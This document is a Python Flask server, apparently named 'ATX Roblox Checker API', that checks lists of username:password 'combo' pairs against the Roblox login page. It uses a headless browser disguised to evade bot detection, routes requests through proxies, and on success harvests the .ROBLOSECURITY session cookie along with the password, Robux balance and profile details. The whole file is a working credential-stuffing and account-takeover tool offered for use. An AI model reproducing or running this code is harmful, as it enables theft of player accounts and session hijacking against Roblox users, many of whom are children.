from flask import Flask, request, jsonify
from flask_cors import CORS
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import json
import threading
import queue
import requests as http_requests
from datetime import datetime
import os
import re
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

app = Flask(__name__)
CORS(app)

class VerificationMode(Enum):
    NORMAL = "normal"
    HEADLESS = "headless"
    STEALTH = "stealth"
    RAPID = "rapid"

@dataclass
class Account:
    username: str
    password: str
    status: str = "unchecked"
    robux: int = 0
    premium: bool = False
    friends: int = 0
    cookies: Optional[Dict] = None
    proxy_used: Optional[str] = None
    verification_time: float = 0.0
    message: str = ""
    user_id: str = ""
    display_name: str = ""
    profile_url: str = ""
    avatar_url: str = ""
    description: str = ""
    account_age: str = ""
    join_date: str = ""
    followers: int = 0
    following: int = 0
    badges: int = 0
    groups_count: int = 0
    top_groups: str = ""
    collectibles: int = 0
    account_banned: bool = False

class RobloxAPILookup:
    
    def __init__(self):
        self.session = http_requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def parse_date(self, date_str):
        if not date_str:
            return "Unknown Date"
        formats = ["%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ"]
        for fmt in formats:
            try:
                return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d %H:%M:%S")
            except ValueError:
                continue
        return "Unknown Date"
    
    def calculate_account_age(self, created_date):
        try:
            if created_date == "Unknown Date":
                return "Unknown"
            
            for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%d"]:
                try:
                    join_date = datetime.strptime(created_date, fmt)
                    break
                except ValueError:
                    continue
            else:
                return "Unknown"
            
            current_date = datetime.now()
            days = (current_date - join_date).days
            years = days // 365
            months = (days % 365) // 30
            remaining_days = (days % 365) % 30
            
            age_parts = []
            if years > 0:
                age_parts.append(f"{years}y")
            if months > 0:
                age_parts.append(f"{months}m")
            if remaining_days > 0 or (years == 0 and months == 0):
                age_parts.append(f"{remaining_days}d")
            
            return f"{' '.join(age_parts)} ({days} days)"
        except:
            return "Unknown"
    
    def get_user_id(self, username):
        try:
            url = "https://users.roblox.com/v1/usernames/users"
            payload = {"usernames": [username], "excludeBannedUsers": False}
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            data = response.json().get("data", [])
            if data and len(data) > 0:
                return data[0].get("id")
            return None
        except Exception:
            return None
    
    def get_user_info(self, user_id):
        try:
            response = self.session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
            response.raise_for_status()
            return response.json()
        except Exception:
            return None
    
    def get_robux_balance(self, user_id, cookie):
        try:
            url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("robux", 0)
            return 0
        except Exception:
            return 0
    
    def check_premium_status(self, user_id, cookie):
        try:
            url = "https://premiumfeatures.roblox.com/v1/user/premium"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get("isPremium", False)
            return False
        except Exception:
            return False
    
    def get_friend_count(self, user_id):
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count", timeout=10)
            return response.json().get("count", 0)
        except:
            return 0
    
    def get_follower_count(self, user_id):
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count", timeout=10)
            return response.json().get("count", 0)
        except:
            return 0
    
    def get_following_count(self, user_id):
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/followings/count", timeout=10)
            return response.json().get("count", 0)
        except:
            return 0
    
    def get_badge_count(self, user_id):
        try:
            response = self.session.get(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100", timeout=10)
            data = response.json()
            return len(data.get("data", []))
        except:
            return 0
    
    def get_groups_info(self, user_id):
        try:
            response = self.session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=10)
            data = response.json()
            groups_data = data.get("data", [])
            
            top_groups = []
            for group in groups_data[:3]:
                group_data = group.get('group', {})
                group_name = group_data.get('name', 'Unknown')
                role_data = group.get('role', {})
                group_role = role_data.get('name', 'Member')
                top_groups.append(f"{group_name} ({group_role})")
            
            groups_display = ", ".join(top_groups) if top_groups else "None"
            if len(groups_data) > 3:
                groups_display += f" and {len(groups_data) - 3} more..."
            
            return {
                'count': len(groups_data),
                'top_groups': groups_display
            }
        except:
            return {'count': 0, 'top_groups': 'None'}
    
    def get_collectibles_count(self, user_id):
        try:
            response = self.session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=1", timeout=10)
            return response.json().get("total", 0)
        except:
            return 0
    
    def get_avatar_url(self, user_id):
        try:
            response = self.session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false", timeout=10)
            data = response.json()
            if data.get("data") and len(data["data"]) > 0:
                return data["data"][0].get("imageUrl", "N/A")
            return "N/A"
        except:
            return "N/A"
    
    def get_full_account_info(self, username: str, cookie: str = None, user_id: str = None) -> Optional[Dict]:
        try:
            if not user_id:
                user_id = self.get_user_id(username)
                if not user_id:
                    return None
            
            profile = self.get_user_info(user_id)
            if not profile:
                return None
            
            friends = self.get_friend_count(user_id)
            followers = self.get_follower_count(user_id)
            following = self.get_following_count(user_id)
            badges = self.get_badge_count(user_id)
            groups_info = self.get_groups_info(user_id)
            collectibles = self.get_collectibles_count(user_id)
            avatar_url = self.get_avatar_url(user_id)
            
            robux = 0
            premium = False
            if cookie:
                robux = self.get_robux_balance(user_id, cookie)
                premium = self.check_premium_status(user_id, cookie)
            
            join_date = self.parse_date(profile.get("created"))
            
            description = profile.get("description", "N/A")
            if description != "N/A" and len(description) > 100:
                description = description[:100] + "..."
            
            return {
                "user_id": str(user_id),
                "display_name": profile.get("displayName", "N/A"),
                "profile_url": f"https://www.roblox.com/users/{user_id}/profile",
                "avatar_url": avatar_url,
                "description": description,
                "account_banned": profile.get("isBanned", False),
                "join_date": join_date,
                "account_age": self.calculate_account_age(join_date),
                "friends": friends,
                "followers": followers,
                "following": following,
                "badges": badges,
                "groups_count": groups_info['count'],
                "top_groups": groups_info['top_groups'],
                "collectibles": collectibles,
                "robux": robux,
                "premium": premium
            }
        except Exception:
            return None

# ============ SELENIUM API SERVER ============

class SeleniumRobloxAPI:
    def __init__(self):
        self.active_drivers = {}
        self.max_drivers = 2  # Limit for Railway
        self.api_lookup = RobloxAPILookup()
        
    def create_driver(self, session_id: str, proxy: str = None):
        """Create a new Chrome driver"""
        options = Options()
        
        # Essential args for headless
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        options.add_argument('--log-level=3')
        
        # Disable automation flags
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # Prefs
        prefs = {
            "credentials_enable_service": False,
            "profile.password_manager_enabled": False,
            "profile.default_content_setting_values.notifications": 2,
        }
        options.add_experimental_option("prefs", prefs)
        
        if proxy:
            options.add_argument(f'--proxy-server={proxy}')
        
        try:
            driver = uc.Chrome(options=options)
            driver.set_page_load_timeout(30)
            driver.set_script_timeout(30)
            
            # Execute CDP commands to hide automation
            driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": """
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                """
            })
            
            self.active_drivers[session_id] = {
                'driver': driver,
                'created_at': time.time(),
                'last_used': time.time(),
                'in_use': True
            }
            return driver
        except Exception as e:
            print(f"Error creating driver: {e}")
            return None
    
    def get_cookie_from_driver(self, driver) -> Optional[str]:
        """Extract .ROBLOSECURITY cookie from driver"""
        try:
            cookies = driver.get_cookies()
            for cookie in cookies:
                if cookie.get('name') == '.ROBLOSECURITY':
                    return cookie.get('value')
            return None
        except Exception:
            return None
    
    def analyze_result(self, driver, elapsed_time: float) -> Tuple[str, str]:
        """Analyze login result"""
        try:
            current_url = driver.current_url.lower()
            
            # Success indicators
            success_indicators = ["/home", "/my/profile", "/users/", "roblox.com/home"]
            for indicator in success_indicators:
                if indicator in current_url:
                    return "valid", "Login successful"
            
            # Check for cookie as additional verification
            cookie = self.get_cookie_from_driver(driver)
            if cookie and len(cookie) > 10:
                return "valid", "Cookie obtained"
            
            # Check for error messages
            error_selectors = [
                "#login-form-error",
                "#password-error", 
                ".alert-danger",
                ".error-message"
            ]
            
            for selector in error_selectors:
                try:
                    elements = driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.is_displayed():
                            text = el.text.lower()
                            if any(word in text for word in ["incorrect", "wrong", "invalid"]):
                                return "invalid_password", "Wrong username or password"
                            if any(word in text for word in ["rate limit", "too many"]):
                                return "rate_limit", "Rate limited"
                except:
                    continue
            
            # Check for CAPTCHA
            try:
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    src = iframe.get_attribute("src") or ""
                    if "recaptcha" in src or "captcha" in src:
                        return "captcha", "CAPTCHA detected"
            except:
                pass
            
            # Still on login page
            if "login" in current_url:
                if elapsed_time > 20:
                    return "timeout", "Login timeout"
                return "checking", f"Waiting... ({int(elapsed_time)}s)"
            
            return "checking", "Processing..."
            
        except Exception as e:
            return "error", f"Analysis error: {str(e)[:50]}"
    
    def check_account(self, username: str, password: str, proxy: str = None) -> Dict:
        """Check a single account using Selenium"""
        session_id = f"{username}_{int(time.time())}"
        driver = None
        
        try:
            # Create driver
            driver = self.create_driver(session_id, proxy)
            if not driver:
                return {
                    'success': False,
                    'status': 'driver_error',
                    'username': username,
                    'message': 'Failed to create browser instance. Server may be overloaded.'
                }
            
            # Navigate to login
            driver.get("https://www.roblox.com/login")
            time.sleep(2)
            
            # Wait for login form
            try:
                WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.ID, "login-username"))
                )
            except TimeoutException:
                return {
                    'success': False,
                    'status': 'timeout',
                    'username': username,
                    'message': 'Login page failed to load'
                }
            
            # Fill username
            username_field = driver.find_element(By.ID, "login-username")
            username_field.clear()
            for char in username:
                username_field.send_keys(char)
                time.sleep(0.02)
            time.sleep(0.3)
            
            # Fill password
            password_field = driver.find_element(By.ID, "login-password")
            password_field.clear()
            for char in password:
                password_field.send_keys(char)
                time.sleep(0.02)
            time.sleep(0.3)
            
            # Click login
            login_button = driver.find_element(By.ID, "login-button")
            login_button.click()
            
            # Wait for result
            start_time = time.time()
            result_status = None
            result_message = None
            
            while time.time() - start_time < 25:
                time.sleep(1)
                status, message = self.analyze_result(driver, time.time() - start_time)
                
                if status != "checking":
                    result_status = status
                    result_message = message
                    break
            
            if not result_status:
                result_status = "timeout"
                result_message = "Verification timeout"
            
            # If valid, get additional info
            if result_status == "valid":
                cookie = self.get_cookie_from_driver(driver)
                
                if cookie:
                    user_info = self.api_lookup.get_full_account_info(username, cookie)
                    if user_info:
                        return {
                            'success': True,
                            'status': 'valid',
                            'username': username,
                            'password': password,
                            'cookie': cookie,
                            'robux': user_info.get('robux', 0),
                            'premium': user_info.get('premium', False),
                            'user_id': user_info.get('user_id'),
                            'display_name': user_info.get('display_name'),
                            'avatar_url': user_info.get('avatar_url'),
                            'friends': user_info.get('friends', 0),
                            'followers': user_info.get('followers', 0),
                            'account_age': user_info.get('account_age'),
                            'message': 'Login successful!'
                        }
                    else:
                        return {
                            'success': True,
                            'status': 'valid',
                            'username': username,
                            'password': password,
                            'cookie': cookie,
                            'robux': 0,
                            'premium': False,
                            'message': 'Login successful but failed to fetch details'
                        }
            
            return {
                'success': False,
                'status': result_status,
                'username': username,
                'message': result_message
            }
            
        except Exception as e:
            return {
                'success': False,
                'status': 'error',
                'username': username,
                'message': str(e)[:100]
            }
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
            if session_id in self.active_drivers:
                del self.active_drivers[session_id]
    
    def cleanup_old_drivers(self):
        """Clean up drivers that haven't been used for 5 minutes"""
        now = time.time()
        to_remove = []
        for sid, info in self.active_drivers.items():
            if now - info['last_used'] > 300:  # 5 minutes
                try:
                    info['driver'].quit()
                except:
                    pass
                to_remove.append(sid)
        
        for sid in to_remove:
            del self.active_drivers[sid]

# ============ FLASK ENDPOINTS ============

api = SeleniumRobloxAPI()
start_time = time.time()

# Cleanup thread
def cleanup_worker():
    while True:
        time.sleep(60)
        api.cleanup_old_drivers()

cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
cleanup_thread.start()

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'active_drivers': len(api.active_drivers),
        'max_drivers': api.max_drivers,
        'uptime': int(time.time() - start_time)
    })

@app.route('/check', methods=['POST'])
def check_account():
    """Check a single account"""
    data = request.json
    
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    username = data.get('username')
    password = data.get('password')
    proxy = data.get('proxy')
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    # Validate input
    if len(username) > 50 or len(password) > 100:
        return jsonify({'error': 'Invalid input length'}), 400
    
    # Check if server is overloaded
    if len(api.active_drivers) >= api.max_drivers:
        return jsonify({
            'success': False,
            'status': 'overloaded',
            'message': 'Server busy, try again in a few seconds'
        }), 503
    
    result = api.check_account(username, password, proxy)
    return jsonify(result)

@app.route('/check-batch', methods=['POST'])
def check_batch():
    """Check multiple accounts (max 5 per request for Railway)"""
    data = request.json
    accounts = data.get('accounts', [])
    
    if len(accounts) > 5:
        return jsonify({'error': 'Maximum 5 accounts per batch for Railway'}), 400
    
    results = []
    for acc in accounts:
        username = acc.get('username')
        password = acc.get('password')
        
        if username and password:
            result = api.check_account(username, password)
            results.append(result)
            time.sleep(3)  # Delay between checks
    
    valid_count = sum(1 for r in results if r.get('status') == 'valid')
    
    return jsonify({
        'total': len(results),
        'valid': valid_count,
        'results': results
    })

@app.route('/check-file', methods=['POST'])
def check_file():
    """Upload and check combo file"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Read and parse combo file
    content = file.read().decode('utf-8', errors='ignore')
    accounts = []
    
    for line in content.split('\n'):
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                accounts.append({
                    'username': parts[0].strip(),
                    'password': parts[1].strip()
                })
    
    if not accounts:
        return jsonify({'error': 'No valid accounts found in file'}), 400
    
    if len(accounts) > 10:
        return jsonify({'error': f'File has {len(accounts)} accounts. Maximum 10 per request.'}), 400
    
    # Process accounts
    results = []
    for acc in accounts:
        result = api.check_account(acc['username'], acc['password'])
        results.append(result)
        time.sleep(2)
    
    valid_count = sum(1 for r in results if r.get('status') == 'valid')
    
    return jsonify({
        'total': len(results),
        'valid': valid_count,
        'results': results
    })

@app.route('/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    return jsonify({
        'active_sessions': len(api.active_drivers),
        'max_sessions': api.max_drivers,
        'uptime_seconds': int(time.time() - start_time),
        'uptime_hours': round((time.time() - start_time) / 3600, 2),
        'sessions_available': api.max_drivers - len(api.active_drivers)
    })

@app.route('/info', methods=['GET'])
def get_info():
    """Get API information"""
    return jsonify({
        'name': 'ATX Roblox Checker API',
        'version': '2.0.0',
        'author': '@AntraxdevZ',
        'endpoints': {
            'POST /check': 'Check single account',
            'POST /check-batch': 'Check multiple accounts (max 5)',
            'POST /check-file': 'Upload and check combo file (max 10 accounts)',
            'GET /health': 'Server health check',
            'GET /stats': 'Server statistics',
            'GET /info': 'API information'
        },
        'rate_limits': {
            'single_check': 'No limit',
            'batch_check': 'Max 5 accounts per request',
            'file_check': 'Max 10 accounts per file'
        }
    })

@app.route('/test', methods=['GET'])
def test_page():
    """Simple test page for browser"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>ATX Roblox Checker API</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
            .container { max-width: 800px; margin: 0 auto; }
            .card { background: #1a1a1a; padding: 20px; border-radius: 10px; margin: 10px 0; }
            input, button { background: #2a2a2a; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; }
            button:hover { background: #0f0; color: #000; cursor: pointer; }
            .result { background: #000; padding: 10px; border-radius: 5px; margin-top: 10px; white-space: pre-wrap; }
            .hit { color: #0f0; }
            .error { color: #f00; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔥 ATX Roblox Checker API</h1>
            <p>Status: <span id="status" class="hit">● ONLINE</span></p>
            
            <div class="card">
                <h3>Single Account Check</h3>
                <input type="text" id="username" placeholder="Username">
                <input type="password" id="password" placeholder="Password">
                <button onclick="checkAccount()">Check</button>
                <div id="result" class="result"></div>
            </div>
            
            <div class="card">
                <h3>Server Stats</h3>
                <button onclick="loadStats()">Refresh Stats</button>
                <div id="stats" class="result"></div>
            </div>
        </div>
        
        <script>
            async function checkAccount() {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const resultDiv = document.getElementById('result');
                
                resultDiv.innerHTML = 'Checking...';
                
                try {
                    const response = await fetch('/check', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username, password })
                    });
                    const data = await response.json();
                    
                    if (data.status === 'valid') {
                        resultDiv.innerHTML = `
                            <span class="hit">✓ VALID ACCOUNT!</span><br>
                            Username: ${data.username}<br>
                            Robux: $${data.robux.toLocaleString()}<br>
                            Premium: ${data.premium ? 'YES' : 'NO'}<br>
                            User ID: ${data.user_id || 'N/A'}<br>
                            Cookie: ${data.cookie ? data.cookie.substring(0, 50) + '...' : 'N/A'}
                        `;
                    } else {
                        resultDiv.innerHTML = `<span class="error">✗ ${data.status}: ${data.message}</span>`;
                    }
                } catch (error) {
                    resultDiv.innerHTML = `<span class="error">Error: ${error.message}</span>`;
                }
            }
            
            async function loadStats() {
                const response = await fetch('/stats');
                const data = await response.json();
                document.getElementById('stats').innerHTML = JSON.stringify(data, null, 2);
            }
            
            loadStats();
        </script>
    </body>
    </html>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║     🔥 ATX ROBLOX CHECKER API SERVER v2.0                    ║
    ║     Created by: @AntraxdevZ                                  ║
    ║                                                              ║
    ║     📍 Running on: http://0.0.0.0:{}                        ║
    ║     🧪 Test page: http://0.0.0.0:{}/test                    ║
    ║                                                              ║
    ║     📌 ENDPOINTS:                                            ║
    ║        POST /check       - Check single account             ║
    ║        POST /check-batch - Check multiple (max 5)           ║
    ║        POST /check-file  - Upload combo file (max 10)       ║
    ║        GET  /health      - Health check                     ║
    ║        GET  /stats       - Server statistics                ║
    ║        GET  /test        - Web test interface               ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """.format(port, port))
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)